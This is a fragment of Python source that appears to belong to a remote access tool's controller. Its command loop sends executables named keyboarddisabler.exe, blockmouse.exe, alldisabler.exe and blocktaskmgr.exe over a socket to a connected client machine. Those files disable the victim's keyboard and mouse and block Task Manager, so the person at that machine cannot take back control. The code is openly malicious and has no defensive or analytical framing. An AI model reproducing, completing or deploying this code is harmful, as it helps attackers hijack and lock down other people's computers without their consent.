    ...
    def execute(self):
        ...
        while True:
            ...
            if command == 'shell':
                ...
                client.send(command.encode())
                file = 'tools\\keyboarddisabler.exe'
                filename = "keyboarddisabler.exe"
                with open(file, 'rb') as f:
                    filedata = f.read(2147483647)
                    f.close()
                client.send(filename.encode())
                client.send(filedata)
                result_output = client.recv(1024).decode()
                ...
                client.send(command.encode())
                file = 'tools\\blockmouse.exe'
                filename = "blockmouse.exe"
                with open(file, 'rb') as f:
                    filedata = f.read(2147483647)
                    f.close()
                client.send(filename.encode())
                ...
                client.send(command.encode())
                file = 'tools\\alldisabler.exe'
                filename = "alldisabler.exe"
                with open(file, 'rb') as f:
                    filedata = f.read(2147483647)
                    f.close()
                client.send(filename.encode())
                ...
                client.send(command.encode())
                file = 'tools\\blocktaskmgr.exe'
                filename = 'blocktaskmgr.exe'
                data = open(file, 'rb')
                filedata = data.read(2147483647)
                client.send(filename.encode())
                client.send(filedata)
